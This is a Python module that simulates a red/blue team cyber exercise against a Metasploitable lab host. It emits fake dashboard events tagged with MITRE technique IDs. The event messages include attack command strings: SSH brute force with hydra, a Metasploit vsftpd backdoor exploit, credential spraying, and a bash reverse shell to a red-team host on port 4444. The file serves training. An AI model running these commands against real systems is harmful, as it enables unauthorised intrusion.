from __future__ import annotations

import asyncio
import random
from datetime import datetime, timezone

from .models import IngestEvent, Severity
from .state import store

RED_SCENARIOS = [
    ("Network port scan", "T1046", Severity.MEDIUM, "in_progress", "nmap -sV 192.168.56.101"),
    ("SSH brute force attempt", "T1110", Severity.HIGH, "in_progress", "hydra -l msfadmin -P rockyou.txt ssh://192.168.56.101"),
    ("Exploit vsftpd backdoor", "T1210", Severity.CRITICAL, "success", "msf exploit(unix/ftp/vsftpd_234_backdoor)"),
    ("SMB enumeration", "T1135", Severity.MEDIUM, "success", "enum4linux -a 192.168.56.101"),
    ("Web directory brute force", "T1083", Severity.LOW, "in_progress", "gobuster dir -u http://192.168.56.101"),
    ("Reverse shell payload sent", "T1059", Severity.CRITICAL, "success", "bash -i >& /dev/tcp/red-team-01/4444"),
    ("Credential spray", "T1110", Severity.HIGH, "failed", "crackmapexec smb 192.168.56.101"),
    ("Post-exploitation whoami", "T1033", Severity.MEDIUM, "success", "whoami on compromised session"),
]

BLUE_SCENARIOS = [
    ("Alert triage started", None, Severity.MEDIUM, "in_progress", "Reviewing SIEM notable for SSH failures"),
    ("Acknowledged brute force alert", None, Severity.HIGH, "in_progress", "INC-001 assigned to Blue Analyst"),
    ("Firewall block rule added", "T1562", Severity.HIGH, "success", "iptables -A INPUT -s 192.168.56.102 -j DROP"),
    ("Investigation opened", None, Severity.MEDIUM, "in_progress", "Timeline analysis on metasploitable auth.log"),
    ("Escalated to incident commander", None, Severity.HIGH, "in_progress", "Severity raised to High"),
    ("Isolated target from network", "T1562", Severity.CRITICAL, "blocked", "VLAN quarantine applied to 192.168.56.101"),
    ("Threat hunt query executed", "T1057", Severity.LOW, "in_progress", "Search: failed auth + external src"),
    ("Containment playbook step 3", None, Severity.MEDIUM, "success", "Disabled vsftpd service on target"),
]

TARGET_SCENARIOS = [
    ("SSH authentication failure spike", None, Severity.HIGH, "detected", "sshd: Failed password for msfadmin"),
    ("FTP anomalous login", None, Severity.MEDIUM, "detected", "vsftpd: OOPS: vsftpd: missing value in config"),
    ("Suspicious outbound connection", None, Severity.CRITICAL, "detected", "NEW outbound TCP to 192.168.56.102:4444"),
    ("Samba access from unknown host", None, Severity.MEDIUM, "detected", "smbd: connection from red-team-01"),
    ("Web server 404 scan pattern", None, Severity.LOW, "detected", "apache: GET /admin /phpmyadmin /dvwa"),
    ("New listener on high port", None, Severity.CRITICAL, "detected", "netstat: LISTEN 0.0.0.0:6200"),
]

PHASES = [
    "Reconnaissance",
    "Initial Access",
    "Exploitation",
    "Post-Exploitation",
    "Containment",
]


class ExerciseSimulator:
    def __init__(self, interval_sec: float = 3.5) -> None:
        self._interval = interval_sec
        self._running = False
        self._tick = 0

    async def run(self) -> None:
        self._running = True
        while self._running:
            self._tick += 1
            if self._tick % 12 == 0:
                phase_idx = min(len(PHASES) - 1, self._tick // 12)
                store.set_phase(PHASES[phase_idx])

            # Weight: red acts more during early phases, blue responds after
            roll = random.random()
            if roll < 0.42:
                await self._emit_red()
            elif roll < 0.78:
                await self._emit_blue()
            else:
                await self._emit_target()

            await asyncio.sleep(self._interval + random.uniform(-0.8, 1.2))

    def stop(self) -> None:
        self._running = False

    async def _emit_red(self) -> None:
        action, mitre, sev, outcome, msg = random.choice(RED_SCENARIOS)
        await store.publish_event(
            IngestEvent(
                team="red",
                actor="Red Operator",
                action=action,
                target="metasploitable (192.168.56.101)",
                severity=sev,
                outcome=outcome,  # type: ignore
                mitre_id=mitre,
                source_host="red-team-01",
                message=msg,
            )
        )

    async def _emit_blue(self) -> None:
        action, mitre, sev, outcome, msg = random.choice(BLUE_SCENARIOS)
        await store.publish_event(
            IngestEvent(
                team="blue",
                actor="Blue Analyst",
                action=action,
                target="metasploitable (192.168.56.101)",
                severity=sev,
                outcome=outcome,  # type: ignore
                mitre_id=mitre,
                source_host="blue-team-01",
                message=msg,
            )
        )

    async def _emit_target(self) -> None:
        action, mitre, sev, outcome, msg = random.choice(TARGET_SCENARIOS)
        await store.publish_event(
            IngestEvent(
                team="target",
                actor="metasploitable",
                action=action,
                target="metasploitable (192.168.56.101)",
                severity=sev,
                outcome=outcome,  # type: ignore
                mitre_id=mitre,
                source_host="metasploitable",
                message=msg,
            )
        )


simulator = ExerciseSimulator()
